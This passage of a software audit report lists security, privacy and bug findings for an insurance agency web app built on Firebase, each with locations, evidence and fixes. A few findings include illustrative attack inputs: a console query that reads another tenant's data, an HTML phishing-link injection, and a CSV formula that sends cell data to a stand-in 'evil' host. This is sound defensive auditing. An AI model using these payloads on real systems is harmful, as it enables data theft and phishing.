#### SEC-06 — Agent-of-month CFs accept a caller-supplied `branchId` *(old SEC-005, STILL-OPEN)*
- **Category / control:** A01; ASVS V4.2.1.
- **Severity:** Medium — a BM can read another branch's candidate production and set its award.
- **Confidence:** Confirmed.
- **Location:** `functions/agentOfMonth/setAgentOfMonth.js:44-72`; `functions/agentOfMonth/getCandidates.js:17-37`.
- **Evidence:** role gate only (`:45` / `:18`). `branchId` is from `data` (`:49` / `:22`). `setAgentOfMonth` checks the *agent* is in the requested branch (`:70`) but not that the *caller* is.
- **Recommendation:** for `branch_manager`, force `branchId = callerDoc.branchId` (or `token.branchId`); allow free choice only for cross-branch roles.
- **Impact:** security ▲; privacy ▲ (other branches' figures); correctness ▲ (award integrity). Effort S · Change-risk Low · Priority P2.

#### SEC-07 — `persistency` `allow list` is tenant-wide for every signed-in role *(old SEC-006, STILL-OPEN)*
- **Category / control:** A01; ASVS V4.2.1, V8.2 (data protection). GDPR Art. 5(1)(f), Art. 32. T&T DPA 2011 general privacy principles (security safeguards).
- **Severity:** High — every agent and every kiosk session can list every agent's persistency figures (business placed, not-takens, lapses, persistency %).
- **Confidence:** Confirmed (rules); exploit needs only a browser console.
- **Location:** `firestore.rules:629-636`.
- **Evidence:** `allow list: if isSignedIn() && getTenantId() == tenantId;`. The comment (`:629-633`) says "Firestore cannot evaluate resource.data for list operations" — **this is incorrect**: list rules may reference `resource.data`, and Firestore then requires the query to be constrained to match. The `get` rule (`:638-644`) is correctly scoped, so the list rule is the only leak. Kiosk sessions carry `tenantId` and so pass.
- **Exploit:** `getDocs(collection(db, 'tenants/T/persistency'))` from any agent session.
- **Recommendation:** mirror the `get` arms in `list` (agent: `resource.data.agentId == request.auth.uid`; BM: branch match via a denormalized `branchId` on the doc since `get()` on the agent doc cannot run per-doc in a list; admins/SM: tenant). Update client queries to carry the matching `where()`.
- **Impact:** security ▲▲; privacy ▲▲▲; cost ▲ (removes an easy full-collection read); UX — if queries are updated together.
- **Effort:** S–M (needs `branchId` denormalization for the BM arm) · **Change-risk:** Med · **Priority:** P1.

#### SEC-08 — Policy, financing and reconciliation access is not branch-scoped *(new)*
- **Category / control:** A01; ASVS V4.2.1. GDPR Art. 25 (data protection by design), Art. 32. ISO 27001 A.5.15.
- **Severity:** High — policyholder PII (owner, insured, premiums) and agents' financing balances are readable by managers of other branches; BMs can change money-affecting state on other branches' policies.
- **Confidence:** Confirmed (rules text).
- **Location:** `firestore.rules:355-366` (policies get/list: any non-UM manager, tenant-wide); `:479-493` (Arm C confirm — BM any branch); `:516-525` (Arm D settled→lapsed — BM any branch); `:806` (financingTerms get); `:808-811` (financingTerms write — BM/SM any agent); `:861-867` (financing months read/write); `:904-910` (reconciliation read/write); `:316-322` (submissions `create`/`update`: any manager, including a UM, may write any tenant submission — no unit/branch clause, unlike the `list` arm at `:311-315`).
- **Evidence:** every arm uses `canManage(tenantId)` or `getRole() == 'branch_manager'` without comparing the doc's or agent's `branchId` to the caller's. UM is unit-scoped for policies only (`:357-358`); for financing a UM passes `canManage` and can read any agent's financing.
- **Exploit:** a BM lapses a settled policy in another branch — this lowers that agent's persistency and award eligibility. A UM reads the whole tenant's financing balances.
- **Recommendation:** denormalize `branchId` onto policies and financing docs (policies may already carry `unitId`; add `branchId` at create and in the OIPA import), then add `resource.data.branchId == callerBranchId(tenantId)` to BM arms and `unitId` scoping to UM arms. Restrict financing to BM+ unless the agent is in the UM's unit.
- **Impact:** security ▲▲; privacy ▲▲▲ (OIPA import brought in the whole book); correctness ▲ (no cross-branch lapses); perf ▼ slight (one `get()` per rule eval, already used elsewhere); maintainability ▲.
- **Effort:** M (backfill + rules + tests) · **Change-risk:** Med · **Priority:** P2.

#### SEC-09 — Financing money fields are only loosely validated at the rules layer *(old SEC-017 PARTIAL, ARCH-002 / BUG-001 STILL-OPEN)*
- **Category / control:** A04 Insecure Design; ASVS V5.1.3 (server-side validation), V11.1 (business logic). SOC 2 PI1.2 (processing integrity).
- **Severity:** Medium — a manager session (or compromised manager) can write any number into financing and move the status machine arbitrarily.
- **Confidence:** Confirmed.
- **Location:** `firestore.rules:790-811, 831-867, 887-910`.
- **Evidence:** amounts are now typed and non-negative (`:791-796`, `:839-848`) — an improvement since July. But `adjustmentPct` is any number (`:849`), `runningBalance` any number (`:839`), the comment states "NO key-allowlist / no hasOnly — the permissive posture" (`:831-832`), and `financingStatus` is checked only for enum membership (`:797`) — transitions are enforced only in service/UI code.
- **Recommendation:** bound `adjustmentPct` (e.g. `-1 <= x <= 1`), add `hasOnly` key allowlists, encode legal status transitions as the policies block already does (`isLegalAgentTransition`, `:78-88`), or move financing writes behind a callable that re-computes derived values.
- **Impact:** security ▲; correctness ▲▲ (money integrity); maintainability ▲. Effort M · Change-risk Med · Priority P2.

#### SEC-10 — Logout keeps the Firestore IndexedDB cache; no recovery from a corrupt cache *(old SEC-011, STILL-OPEN, widened)*
- **Category / control:** ASVS V3.3.1 (logout invalidates session data), V8.2.1 (client-side sensitive data); A04. GDPR Art. 32. ISO 27001 A.8.1 (user endpoint devices).
- **Severity:** Medium — sensitive cached data survives logout on shared/lost phones; a corrupt cache bricks the app for that user.
- **Confidence:** Confirmed (source). Corrupt-cache path: observed in production 2026-09-23 (`FIRESTORE INTERNAL ASSERTION FAILED … ID: b815`, app stuck on load) per the audit brief; not reproduced here.
- **Location:** `src/services/authService.js:17-19` (`signOut` = `firebaseSignOut(auth)` only); `src/firebase.js:23-27` (`persistentLocalCache` + `persistentMultipleTabManager`, no fallback); `src/App.jsx:67, 95` (two more raw `signOut(auth)` calls); `src/components/ui/ChunkLoadErrorBoundary.jsx` handles only lazy-chunk failures.
- **Evidence:** no `terminate()` + `clearIndexedDbPersistence()` anywhere in `src/`; no `indexedDB.deleteDatabase`; no try/catch around cache init; no boundary for Firestore internal assertions.
- **Exploit / failure:** agent A logs out on a shared device; agent B (or a thief) opens DevTools → Application → IndexedDB and reads A's policies, financing, persistency and any tenant-wide lists (see SEC-07). Separately, a cache in a bad state makes every load fail until the user manually clears site data — field agents cannot do that.
- **Recommendation:** in `authService.signOut`: `await terminate(db); await clearIndexedDbPersistence(db); await firebaseSignOut(auth); location.reload()`. Route the two `App.jsx` calls through it. Add a top-level error boundary / `window.onerror` hook that, on a Firestore `INTERNAL ASSERTION FAILED`, offers "Repair app data" (clear persistence + reload). Consider memory cache on devices flagged as shared (kiosk already).
- **Impact:** security ▲▲; privacy ▲▲; UX ▲▲ (self-service recovery); perf ▼ slight (cold cache after logout); cost ▼ slight (re-reads). Effort S · Change-risk Low · Priority P1.

#### SEC-11 — No Firebase App Check on Firestore, Functions or Storage *(old SEC-003 + COST-002, STILL-OPEN)*
- **Category / control:** A04; ASVS V11.1.4 (anti-automation); ISO 27001 A.8.16.
- **Severity:** Medium — the public Firebase web config (by design in the bundle) lets any script call Functions and hit Firestore with a valid login, or hammer unauthenticated endpoints.
- **Confidence:** Confirmed (zero hits for `initializeAppCheck` / `appCheck` in `src/` and `functions/`).
- **Location:** `src/firebase.js:21-30`; every `functions.https.onCall` in `functions/index.js`.
- **Recommendation:** enable App Check with reCAPTCHA Enterprise (web) in monitor mode, then enforce per service. Exempt the server-to-server `ingestCallActivity` webhook and the kiosk validator (or give the kiosk a debug provider).
- **Impact:** security ▲; cost ▲▲ (abuse ceiling); UX — (invisible); maintainability ▼ slight (emulator/debug tokens). Effort M · Change-risk Med · Priority P2.

#### SEC-12 — `storage.rules` absent from the repo while Storage is in use *(old SEC-002, STILL-OPEN)*
- **Category / control:** A05 Security Misconfiguration; ISO 27001 A.8.9 (configuration management), A.8.32 (change management).
- **Severity:** Medium.
- **Confidence:** NEEDS-VERIFICATION — confirm in Firebase Console → Storage → Rules that `avatars/{tenantId}/{uid}.jpg` is write-restricted to the owner (and size/type-limited) and reads are tenant-scoped.
- **Location:** repo root (no `storage.rules`); `firebase.json` has no `storage` key.
- **Evidence / scenario:** rules live only in the console, are not reviewed, not tested, and not reproducible. A console edit can silently open all avatars (or allow arbitrary uploads = cost + hosting abuse).
- **Recommendation:** pull the live rules into `storage.rules`, add `"storage": {"rules": "storage.rules"}` to `firebase.json`, add emulator tests.
- **Impact:** security ▲; maintainability ▲. Effort S · Change-risk Low · Priority P2.

#### SEC-13 — No security headers *(old SEC-007, STILL-OPEN)*
- **Category / control:** A05; ASVS V14.4.1–V14.4.7.
- **Severity:** Medium.
- **Confidence:** Confirmed — `vercel.json` has only a SPA rewrite; `index.html` has no CSP meta.
- **Location:** `vercel.json:1-5`; `index.html:1-11`.
- **Scenario:** app can be framed (clickjacking of confirm/lapse buttons); no CSP means any XSS has unrestricted exfiltration to any origin; no HSTS preload.
- **Recommendation:** add `headers` in `vercel.json`: `Content-Security-Policy` (start in report-only; allow self, Firebase, Fontshare, Clarity), `X-Frame-Options: DENY` / `frame-ancestors 'none'`, `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy`.
- **Impact:** security ▲▲; UX — ; maintainability ▼ slight (CSP upkeep). Effort S · Change-risk Low (report-only first) · Priority P2.

#### SEC-14 — Email templates interpolate values into HTML without escaping *(old SEC-009, STILL-OPEN)*
- **Category / control:** A03 Injection (HTML injection in email); ASVS V5.3.1.
- **Severity:** Medium — inputs are mostly manager/admin-set names, which lowers likelihood; impact is phishing content inside a legitimate Tatil/AgencyTrack email.
- **Confidence:** Confirmed.
- **Location:** `functions/utils/email.js:18-24` (`renderTemplate`) and `:32-36` (`renderString`): `String(vars[key])` inserted raw. Templates: `functions/email-templates/*.html` (e.g. `compliance-nudge.html:31,33`; `financing-adjustment-notify.html:31-40`).
- **Scenario:** a user whose `name` contains `<a href="https://evil">Reset your password</a>` receives (or causes others to receive) an email with a live phishing link.
- **Recommendation:** HTML-escape every value in `renderTemplate` when the file ends in `.html`; keep `.txt` raw. Add a unit test with `<script>` and `"` in a var.
- **Impact:** security ▲; maintainability ▲. Effort S · Change-risk Low · Priority P2.

#### SEC-15 — CSV exports lack formula-injection neutralization *(old SEC-013, STILL-OPEN)*
- **Category / control:** A03 (CSV injection, CWE-1236); ASVS V5.3.10.
- **Severity:** Medium — OIPA-imported owner/insured names and agent-typed notes now flow into exports that managers open in Excel.
- **Confidence:** Confirmed.
- **Location:** `src/lib/csvExport.js:13-20` (quotes on `, " \n \r` only); separate builders at `src/components/manager/MasterSheet.jsx:422`, `src/components/manager/PersistencyTab.jsx:215`, `src/services/exportService.js:226`.
- **Scenario:** a policy note `=HYPERLINK("https://evil/?x="&A1,"Click")` becomes a live formula in the manager's spreadsheet.
- **Recommendation:** in `escapeCsvField`, prefix `'` when the string starts with `= + - @ \t \r`; route the three bespoke builders through `buildCsvContent`.
- **Impact:** security ▲; maintainability ▲ (one CSV path). Effort S · Change-risk Low · Priority P2.

#### SEC-16 — Dependency vulnerabilities in `functions/` *(old SEC-014, STILL-OPEN in functions; root FIXED)*
- **Category / control:** A06 Vulnerable & Outdated Components; ASVS V14.2.1. ISO 27001 A.8.8.
- **Severity:** Medium — the critical/high items are transitive (Google client libs, `exceljs`, `form-data`, `websocket-driver`); reachability from AgencyTrack's own code is unproven.
- **Confidence:** Confirmed (audit output); reachability NEEDS-VERIFICATION (`npm ls websocket-driver protobufjs @grpc/grpc-js form-data` in `functions/`).
- **Evidence — `npm audit --omit=dev` summary lines, verbatim:**
  - root: `found 0 vulnerabilities`
  - `functions/`: `16 vulnerabilities (1 low, 9 moderate, 5 high, 1 critical)` — critical `websocket-driver <=0.7.4`; high `@grpc/grpc-js 1.14.0 - 1.14.3`, `brace-expansion <=1.1.17`, `fast-xml-builder <=1.1.6`, `form-data <2.5.6`, `protobufjs <=7.6.4`; moderate `uuid <11.1.1` (fix forces `exceljs@3.4.0`, breaking).
- **Recommendation:** run `npm audit fix` (non-force) in `functions/` on a branch and re-run functions tests; handle `uuid`/`exceljs` separately. The pending Node 22 / firebase-functions v7 briefs (`docs/briefs/node22-runtime-upgrade.md`, `docs/briefs/firebase-functions-v7-upgrade.md`, untracked) are the natural vehicle. Add `npm audit --omit=dev --audit-level=high` to CI for both packages.
- **Impact:** security ▲; maintainability ▲. Effort S–M · Change-risk Med (functions deploy) · Priority P2.

#### SEC-17 — `resolveSalesManagerUid` has no role gate *(old SEC-012, STILL-OPEN)*
- **Category / control:** A01; ASVS V4.1.3.
- **Severity:** Low — returns only a uid; any signed-in identity (including kiosk) can call it.
- **Location:** `functions/index.js:464-482`. Only caller: `src/services/goalsService.js:324`.
- **Recommendation:** allow only the roles that use goals (agent, UM, BM). Effort S · Change-risk Low · Priority P4.

#### SEC-18 — Client role routing falls back to the Firestore user doc's `role` *(old SEC-016, STILL-OPEN)*
- **Category / control:** A01 (defence in depth); ASVS V4.1.1.
- **Severity:** Low — rules trust claims only (`firestore.rules:9-15`), so this affects which UI renders, not data access.
- **Location:** `src/context/AuthContext.jsx:90-99` (`claims.role ?? doc.role`, `claims.tenantId ?? doc.tenantId`).
- **Scenario:** a claim/doc divergence (e.g. failed `updateUser` rollback, `functions/index.js:1160-1175`) renders a manager UI to an agent; every query then fails with permission errors — confusing, not a breach.
- **Recommendation:** treat a missing claim as "provisioning incomplete" and show that state, instead of trusting the doc. Effort S · Change-risk Low · Priority P4.

#### SEC-19 — Tracked verification script holds a seeded-account password literal *(old SEC-015, PARTIAL)*
- **Category / control:** A07; ASVS V2.10.4; ISO 27001 A.5.17.
- **Severity:** Low.
- **Location:** `scripts/verification/shakedown/seed-phase.mjs:108` (13-character literal; value not reproduced here). `functions/create-test-managers.cjs` also holds literals (`:12, :18, :27, :47`) but is **untracked**. `scripts/verification/lib/emulator-seed.cjs` is emulator-only (acceptable).
- **Recommendation:** read the password from `.env.local` (document in `.env.example` per Rule 14); rotate any production/staging account that ever used that literal (NEEDS-VERIFICATION which environment `seed-phase.mjs` targets).
- **Effort:** S · Change-risk Low · Priority P3.

#### SEC-20 — CI supply-chain hygiene *(old SEC-008, PARTIAL)*
- **Category / control:** A08 Software & Data Integrity Failures; SLSA L1–2; ISO 27001 A.8.30.
- **Severity:** Low.
- **Location:** `.github/workflows/ci.yml`.
- **Evidence:** the unpinned Gemini action and its `GEMINI_API_KEY` are gone (Gemini retired 2026-07-17); `persist-credentials: false` on every checkout; the a11y job declares least-privilege `permissions`. Remaining: actions pinned by tag, not SHA (`actions/checkout@v5`, `actions/setup-node@v6`, `dorny/paths-filter@v3`, `actions/setup-java@v4`, `actions/upload-artifact@v4`); no workflow-level `permissions:` default for `lint-and-build` / `functions-tests`; triggers are `pull_request` only (good — no `pull_request_target`).
- **Recommendation:** pin third-party actions (at least `dorny/paths-filter`) to full SHAs; add `permissions: contents: read` at workflow level. Effort S · Change-risk Low · Priority P4.

#### SEC-21 — Firestore rules tests never run in CI *(new)*
- **Category / control:** A04; ASVS V1.1.2 (verified security controls); ISO 27001 A.8.29 (security testing in development), A.8.32. SOC 2 CC8.1.
- **Severity:** High — the rules file is 2,322 lines and is the primary authorization layer; `main` protection is admin-bypassable (CLAUDE.md § Workflow). Every finding in this section is a rules or CF authorization gap that a test would pin.
- **Confidence:** Confirmed.
- **Location:** `vite.config.js:101-108` excludes `tests/rules/**` and `firestore.rules.test.mjs` ("require a running Firebase emulator"); `.github/workflows/ci.yml` runs `npm test -- --run` (`lint-and-build`) and `jest` in `functions/` — no emulator job for rules. The a11y job already proves emulator-in-CI works (`ci.yml` a11y job, `firebase emulators:exec`).
- **Recommendation:** add a `rules-tests` job: JDK 21 + pinned `firebase-tools` + `firebase emulators:exec --only firestore "npx vitest run --config vitest.rules.config.js"`; make it a required check. Add negative tests for SEC-01…SEC-08 first.
- **Impact:** security ▲▲▲ (regression net); maintainability ▲▲; cost ▼ slight (CI minutes). Effort M · Change-risk Low · Priority P1.

#### SEC-22 — Kiosk tokens are stored and readable in plaintext *(new)*
- **Category / control:** ASVS V2.9 / V3.5.2 (token storage); A02.
- **Severity:** Low (would be Medium without SEC-03's fix, which removes manager reads).
- **Location:** `functions/kiosk/createToken.js:28-44` (token is the doc ID); contrast `functions/callActivity/resolveCallSource.js:9-16` and `functions/callSources/createCallSource.js` (SHA-256 `tokenHash`, never stored raw).
- **Recommendation:** store `tokenHash` and use a random doc ID, mirroring call sources. Effort S · Change-risk Med (existing kiosk URLs must be re-issued) · Priority P3.

### 4.2 Data protection & compliance (GDPR benchmark · ISO/IEC 27001:2022 Annex A · SOC 2 TSC · T&T Data Protection Act 2011)

**PII and financial-data inventory (current source):**

| Data | Where | Subjects | Notes |
|---|---|---|---|
| Name, email, phone, DOB, agent number, contract dates, photo, bio | `tenants/{t}/users/{uid}`; Storage `avatars/{t}/{uid}.jpg` | Agents, managers | DOB + agent number write-once by owner (`firestore.rules:221-235`) |
| Policy owner / insured names, policy number, premiums, coverage, status history | `tenants/{t}/policies/{id}` + `history` sub-collection | **Policyholders (third parties)** | Now bulk-loaded from OIPA exports (`functions/portfolioImport/*`, `src/lib/portfolioImport/*`) |
| Prospect details | `users/{uid}/prospectInfo/{id}` (`firestore.rules:1183`) | Prospects (third parties) | |
| Household budget, money needs, year/monthly plans | `users/{uid}/moneyNeeds`, `yearPlan`, `monthlyPlan` | Agents | Clarity-masked |
| Financing terms, statements, balances, reconciliation, escalations | `financingTerms`, `financing`, `financingReconciliation`, `financingEscalations` | Agents | Money of record |
| Persistency inputs and % | `persistency/{agentId_YYYY_MM}` | Agents | Tenant-wide list (SEC-07) |
| Coaching notes, joint calls, weekly/monthly manager reports | `users/{id}/coachingNotes`, `jointCalls`, `managerWeeklyReports`, `managerMonthlyRollups` | Agents (subject), managers | Subject cannot read coaching notes |
| Call activity metadata | written by `ingestCallActivity` | Agents; call counterparties by count only | Raw fields capped at 200 chars (`ingestCallActivity.js:159`) |
| Email queue | `mail/{id}` | Recipients | Firebase Trigger Email extension; no TTL |
| Session recordings | Microsoft Clarity | All users | Masked on money surfaces |

#### PRIV-01 — No erasure path *(old PRIV-001 / A4:PRIV-002, STILL-OPEN)*
- **Control:** GDPR Art. 17; T&T DPA 2011 General Privacy Principles (retention and disposal; the DPA's Part III principles are not all in force — NEEDS-VERIFICATION of commencement); ISO 27001 A.8.10 (information deletion); SOC 2 P4.3.
- **Severity:** High — the pilot adds real policyholder books; there is no way to honour a deletion request or purge a departed agent.
- **Location:** no erasure export in `functions/`; `deactivateUser` is soft (`functions/index.js:869-935`); `allow delete: if false` on policies (`firestore.rules:527`), persistency (`:656`), financing (`:813, :869, :912`).
- **Recommendation:** an admin-only `eraseSubject` CF that deletes or pseudonymizes a user's docs, sub-collections, avatar and Auth record, and a policyholder-level redaction (owner/insured name → hash) for OIPA-sourced policies; log each erasure in an audit collection. Document legal-hold exceptions (insurance records often must be kept — define what is kept, where and why).
- **Impact:** privacy ▲▲▲; maintainability ▼ (new admin path). Effort L · Change-risk Med · Priority P2.

#### PRIV-02 — No lawful-basis or consent record for third-party PII *(old PRIV-002 / A4:PRIV-006, STILL-OPEN, widened by OIPA import)*
- **Control:** GDPR Art. 6, 13/14; T&T DPA 2011 (collection with knowledge/consent; purpose limitation); ISO 27001 A.5.34.
- **Severity:** High — AgencyTrack is now processing Tatil's policyholder records at book scale, as a processor for Tatil and possibly as its own controller for agent-entered prospects.
- **Location:** no `lawfulBasis` / `consent` / `source` provenance on policies or prospects (`src/services/policiesService.js`, `src/services/prospectInfoService.js`); OIPA import writes policyholder names (`functions/portfolioImport/applyPlan.js`).
- **Recommendation:** a written data-processing agreement with Tatil naming AgencyTrack as processor; record `dataSource` (`oipa-import` / `agent-entry`) on every policy/prospect; a privacy notice for agents; minimise imported columns to what the ledger needs.
- **Impact:** privacy/compliance ▲▲▲. Effort M (mostly paperwork + one field) · Change-risk Low · Priority P2.

#### PRIV-03 — No audit trail on reads or exports; no subject-access export *(old PRIV-004, PRIV-010, A4:PRIV-003/005, STILL-OPEN)*
- **Control:** GDPR Art. 15, 20, 30; ISO 27001 A.8.15 (logging); SOC 2 CC7.2.
- **Severity:** Medium.
- **Location:** exports are client-side Blobs (`src/lib/csvExport.js:43`, `src/components/manager/MasterSheet.jsx:422`, `src/components/manager/PersistencyTab.jsx:215`, `src/services/exportService.js:226`) with no server record; admin audit collections exist only for account creation, invite resends and email changes (`firestore.rules:94-129`).
- **Recommendation:** a `logExport` callable invoked before each export (who, what scope, row count); enable Cloud Audit Logs Data Access for Firestore on the production project; a per-subject export CF for DSARs.
- **Impact:** privacy ▲▲; cost ▼ slight (Data Access logs). Effort M · Change-risk Low · Priority P3.

#### PRIV-04 — No breach detection or alerting *(old PRIV-005, STILL-OPEN)*
- **Control:** GDPR Art. 33/34 (72 h); ISO 27001 A.5.24–A.5.26, A.8.16; SOC 2 CC7.3–CC7.4.
- **Severity:** Medium.
- **Location:** `functions/` logs with `console.*` only; no alert policies in repo; no incident runbook in `docs/runbooks/` for data breach.
- **Recommendation:** Cloud Monitoring alerts on spikes of `permission-denied`, function errors and Firestore reads; a one-page breach runbook (who decides, who tells Tatil, the T&T regulator question, the 72 h clock).
- **Impact:** compliance ▲▲. Effort M · Change-risk Low · Priority P2.

#### PRIV-05 — No retention policy or TTL *(old PRIV-009, STILL-OPEN)*
- **Control:** GDPR Art. 5(1)(e); ISO 27001 A.5.33, A.8.10.
- **Severity:** Medium.
- **Location:** no TTL fields or purge jobs; `mail/` queue and `notifications/` grow forever; import plans are purged only on the next preview (`functions/portfolioImport/previewImport.js:144`).
- **Recommendation:** a retention schedule (e.g. mail 30 days, notifications 180 days, import plans 7 days, deactivated users N years per Tatil policy) enforced with Firestore TTL policies.
- **Impact:** privacy ▲; cost ▲ (storage). Effort M · Change-risk Low · Priority P3.

#### PRIV-06 — US data residency; no processor register *(old PRIV-007, STILL-OPEN)*
- **Control:** GDPR Ch. V (transfers); T&T DPA 2011 cross-border transfer provision (NEEDS-VERIFICATION of section number and whether it is in force — the Act was proclaimed only in part); ISO 27001 A.5.19–A.5.22 (supplier relationships).
- **Severity:** Medium.
- **Confidence:** Functions region Confirmed (no `.region()` ⇒ `us-central1`); Firestore location NEEDS-VERIFICATION (Console → Firestore → location; the 07-11 audit reported `nam5`).
- **Processors seen in source:** Google Cloud / Firebase (data store, auth, functions), Vercel (hosting; no data at rest), Microsoft Clarity (session recording), the email relay behind the Firebase Trigger Email extension (`firebase.json` `firestore-send-email@0.2.9`; the brief names SendGrid — NEEDS-VERIFICATION of the SMTP URI in the extension config).
- **Recommendation:** record residency in the DPA with Tatil; keep a processor register with DPAs for each; decide whether any Caribbean or EU residency is required before multi-tenant sales.
- **Effort:** S (document) / L (migrate) · Change-risk Low / High · Priority P2 (document).

#### PRIV-07 — Privileged access: key files on disk, broad admin reach *(old PRIV-008, PARTIAL)*
- **Control:** ISO 27001 A.5.15, A.5.18, A.8.2; SOC 2 CC6.1–CC6.3.
- **Severity:** Medium.
- **Location:** `functions/service-account-key.json` and `functions/service-account-key.staging.json` exist on the developer machine (git-ignored, `.gitignore:26, 30`); CFs themselves use ambient credentials (`functions/index.js:12-15`). `platform_admin` bypasses every tenant check by design; `tenant_admin` does too today (SEC-02); SEC-01 lets a tenant admin become platform admin.
- **Recommendation:** after confirming no script needs them, revoke the keys in IAM and move scripts to `gcloud auth application-default login`; list IAM principals with `roles/owner`/`editor` and reduce; fix SEC-01 and SEC-02.
- **Effort:** S · Change-risk Med (scripts that read the key) · Priority P2.

#### PRIV-08 — Coaching notes about an agent are hidden from that agent *(old PRIV-003, STILL-OPEN by design)*
- **Control:** GDPR Art. 15 (access includes manager notes unless an exemption applies).
- **Severity:** Low (a deliberate product decision, `firestore.rules:1104-1117`).
- **Recommendation:** keep the in-app exclusion but include coaching notes in the DSAR export (PRIV-03), and tell agents in the privacy notice that such notes exist.
- Effort S · Priority P3.

#### PRIV-09 — No field-level encryption for financial data *(old PRIV-011, STILL-OPEN; Info)*
- **Control:** ISO 27001 A.8.24.
- **Severity:** Info — Google encrypts at rest; field-level crypto would break queries and is not required by the T&T DPA. Revisit only for national-ID or bank details, which the app does not store today.

### 4.3 Correctness & bugs

#### BUG-01 — Agent-declared `settled` counts as production and award credit without manager confirmation *(new)*
- **Category / control:** Processing integrity (SOC 2 PI1.3); v3 non-negotiable 5 ("Evidenced and declared are never blended").
- **Severity:** Medium — money-adjacent: awards carry cash (`src/utils/awardsEngine.js:50-93` cash suppression logic exists precisely because awards pay out).
- **Confidence:** NEEDS-VERIFICATION of business intent — confirm with the dispatcher whether unconfirmed settled policies may count toward heroes and awards.
- **Location:** `firestore.rules:411-461` (Arm B — the agent moves own policy `submitted → settled`); `src/lib/policyLedgerDerivation.js:23-31` (`policyValue` = `managerSettledAPI ?? settledAPI ?? proposedAPI ?? 0` — prefers the confirmed figure *when present* but never requires it); `src/lib/ledgerProduction.js` (settled totals by `dateIssued`) and `awardRowsFromLedger` (`:157-174`).
- **Scenario:** an agent marks a pending application settled on 30 Nov; it counts for November production, Christmas-campaign standing and award qualification before any manager sees it. If it later NTUs, the displayed figures were confidently wrong.
- **Recommendation:** either (a) count only `confirmedByManager == true` in award/hero totals and show "declared, awaiting confirmation" separately, or (b) keep counting but label the figure's provenance and the % confirmed, per non-negotiable 5.
- **Impact:** correctness ▲▲; UX ▲ (honest provenance); maintainability —. Effort M · Change-risk Med · Priority P2.

#### BUG-02 — Client "today" derived from UTC in ~27 places *(old BUG-007, PARTIAL)*
- **Category / control:** Correctness (dates, UTC-4 invariant).
- **Severity:** Medium — between 20:00 and 24:00 Trinidad time these sites compute *tomorrow*.
- **Confidence:** Confirmed (27 non-test matches of `toISOString().slice(0,10)` / `split('T')` in `src/`); some are safe because the Date is pre-anchored.
- **Location (unsafe examples):** `src/components/agent/policyLedger/CampaignLensPanel.jsx:253` (`today` for campaign windows); `src/components/campaigns/CampaignPanel.jsx:27`; `src/components/manager/EditUserDrawer.jsx:99`; `src/components/manager/UserManagementPanel.jsx:141, 299` (contract-start "not in future" check wrongly allows tomorrow after 20:00). Safe by construction: `src/components/manager/CompliancePanel.jsx:36-42` (TT-midnight anchor), `src/lib/ledgerProduction.js:108-114`, `functions/callActivity/ingestCallActivity.js:188, 210`.
- **Scenario:** at 21:00 on 31 Dec (last day of the Christmas campaign) the campaign lens already treats the campaign as over.
- **Recommendation:** one `todayTT()` helper (UTC-4 offset, as `functions/agentOfMonth/setAgentOfMonth.js:12-17` already does) and a lint rule banning `toISOString().slice(0, 10)` outside it.
- **Impact:** correctness ▲▲; maintainability ▲. Effort M · Change-risk Low · Priority P2.

#### BUG-03 — Money coercion `parseFloat(v) || 0` is copy-pasted across money engines *(new)*
- **Category / control:** Correctness / v3 non-negotiable 11 ("Silent fallbacks throw in development").
- **Severity:** Medium — a malformed field shows as a confident 0 in a financing or award figure instead of failing loudly.
- **Location:** `src/utils/awardsEngine.js:5`; `src/lib/financingBonusEngine.js:19`; `src/lib/financingProration.js:26`; `src/lib/financingReconciliation.js:34`; `src/lib/financingProjectedBonus.js:100-101, 110`; `src/lib/financingTakeHome.js:30`; `src/lib/persistency/persistencyOutlook.js:269`; rounding helpers duplicated as `cents()` (`src/lib/ledgerProduction.js:116`) and `money2()` (`src/lib/persistency/persistencyOutlook.js:63`).
- **Recommendation:** one `toMoney(v, {field})` in `src/utils/formatters.js` (or `src/lib/money.js`) that returns 0 for `null/undefined/''` and **throws in dev / logs in prod** for non-numeric strings; one `roundMoney`. Replace the copies.
- **Impact:** correctness ▲; maintainability ▲▲. Effort M · Change-risk Low (pure functions, well tested) · Priority P3.

#### BUG-04 — YTD production is aggregated in two independent loops *(new)*
- **Category / control:** Single-source-of-truth (v3 non-negotiable 1/2 spirit).
- **Severity:** Medium — the hero and the awards panel can disagree for the same agent and year.
- **Confidence:** NEEDS-VERIFICATION — confirm whether the self/family handling differences are intended; then add a parity test.
- **Location:** `src/lib/ledgerProduction.js` (`deriveYearProduction`) vs `awardRowsFromLedger` (`src/lib/ledgerProduction.js:157-174`) and `src/lib/policyCampaignLens.js`; both use `productionCredit()` but accumulate separately with different self/family treatment.
- **Recommendation:** derive award rows from the same per-policy credit list the hero uses, or add a property test asserting equality where rules coincide.
- **Impact:** correctness ▲; maintainability ▲. Effort S · Change-risk Low · Priority P2.

#### BUG-05 — Persistency money inputs are agent-self-writable at the rules layer *(new)*
- **Category / control:** Processing integrity; v3 rule "Evidenced and declared are never blended".
- **Severity:** Low — values are bounded non-negative (`firestore.rules:615-619`) and the confirm sheet gates saves (`src/components/persistency/ConfirmPersistencySheet.jsx:41-63`).
- **Confidence:** NEEDS-VERIFICATION of intent — CLAUDE.md describes persistency as "manager-entered".
- **Location:** `firestore.rules:648-652` (`isAgent() && request.resource.data.agentId == request.auth.uid`).
- **Recommendation:** if agents are meant to confirm against the HO report, stamp `enteredBy` / role and show provenance; if not, remove the agent arm. Effort S · Change-risk Low · Priority P3.

#### BUG-06 — Campaign progress read failure renders as zero *(A4:BUG-001, PARTIAL)*
- **Severity:** Low — a confident wrong number (0 progress) during a campaign.
- **Location:** `src/components/dashboard/AgentDashboard.jsx:478-479` (`.catch(... return [];)` per campaign; the card then renders 0).
- **Recommendation:** store `null` / an error flag per campaign and render "couldn't load" instead of 0. Effort S · Change-risk Low · Priority P3.

#### BUG-07 — Financing status transitions and reconciliation are non-atomic *(old BUG-001, BUG-002, STILL-OPEN)*
- **Category / control:** SOC 2 PI1.3; money integrity.
- **Severity:** Medium — two managers acting at once, or a network drop mid-reconcile, can leave terms and reconciliation disagreeing.
- **Location:** `src/services/financingService.js:160-186` (`getDoc` → `isLegalFinancingTransition` → `setDoc`, no transaction); `:519-610` `reconcileFinancing` writes the reconciliation doc (`:586` / `:596`) and then calls `transitionFinancingStatus` (`:601`) as a second, separate write.
